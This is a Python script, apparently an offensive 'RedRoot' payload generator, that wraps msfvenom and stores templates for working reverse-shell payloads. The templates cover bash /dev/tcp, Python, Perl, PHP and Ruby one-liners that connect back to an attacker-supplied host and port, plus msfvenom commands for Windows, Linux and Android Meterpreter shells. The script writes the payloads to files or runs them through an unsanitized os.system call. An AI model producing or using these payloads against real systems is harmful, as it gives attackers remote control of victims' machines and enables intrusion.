#!/usr/bin/env python3
import os
import json
import argparse
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from datetime import datetime

console = Console()

PAYLOAD_TEMPLATES = {
    "windows/exec": "msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {outfile}",
    "windows/powershell": "msfvenom -p windows/powershell_reverse_tcp LHOST={lhost} LPORT={lport} -f ps1 -o {outfile}",
    "linux/elf": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {outfile}",
    "linux/bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "python": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
    "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "android": "msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {outfile}",
    "php": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
}

def redroot_banner():
    console.print(Panel.fit("[bold red]💉 REDROOT VENOM PAYLOAD GENERATOR[/bold red]\n[cyan]MSFvenom-style payload creation tool with multiple formats[/cyan]"))

def show_payload_options():
    table = Table(title="Available Payloads", box=None, highlight=True)
    table.add_column("Payload", style="cyan")
    table.add_column("Description", style="green")
    table.add_row("windows/exec", "Windows shell reverse TCP")
    table.add_row("windows/powershell", "Windows PowerShell reverse TCP")
    table.add_row("linux/elf", "Linux ELF reverse shell")
    table.add_row("linux/bash", "Linux Bash reverse shell")
    table.add_row("python", "Python reverse shell")
    table.add_row("perl", "Perl reverse shell")
    table.add_row("php", "PHP reverse shell")
    table.add_row("ruby", "Ruby reverse shell")
    table.add_row("android", "Android Meterpreter reverse shell")
    console.print(table)

def generate_payload(payload, lhost, lport, output):
    if payload not in PAYLOAD_TEMPLATES:
        console.print(f"[red][-] Invalid payload type: {payload}[/red]")
        show_payload_options()
        return

    cmd = PAYLOAD_TEMPLATES[payload].format(lhost=lhost, lport=lport, outfile=output)

    if any(payload.startswith(p) for p in ["linux/bash", "python", "perl", "php", "ruby"]):
        with open(output, "w") as f:
            f.write(cmd + "\n")
        console.print(f"[green][✓][/green] Reverse shell script saved to [bold]{output}[/bold]")
    else:
        console.print(f"[yellow][*][/yellow] Generating payload using: [italic]{cmd}[/italic]")
        os.system(cmd)
        if os.path.exists(output):
            console.print(f"[green][✓][/green] Payload saved to [bold]{output}[/bold]")
        else:
            console.print(f"[red][-] Failed to generate payload[/red]")

def save_metadata(payload, lhost, lport, output):
    metadata = {
        "payload": payload,
        "lhost": lhost,
        "lport": lport,
        "output_file": output,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    with open("payload_logs.json", "a") as f:
        f.write(json.dumps(metadata) + "\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="🎯 RedRoot Payload Generator (MSFvenom-style)")
    parser.add_argument("-p", "--payload", help="Payload type")
    parser.add_argument("-l", "--lhost", help="Local host IP")
    parser.add_argument("-P", "--lport", help="Local port")
    parser.add_argument("-o", "--output", default="output/payload.out", help="Output file path")
    parser.add_argument("--list", action="store_true", help="List available payloads")

    args = parser.parse_args()
    redroot_banner()

    if args.list:
        show_payload_options()
        exit()

    if not (args.payload and args.lhost and args.lport):
        console.print("[red][-] Missing required arguments. Use --help for usage.[/red]")
        exit()

    os.makedirs(os.path.dirname(args.output), exist_ok=True)
    generate_payload(args.payload, args.lhost, args.lport, args.output)
    save_metadata(args.payload, args.lhost, args.lport, args.output)
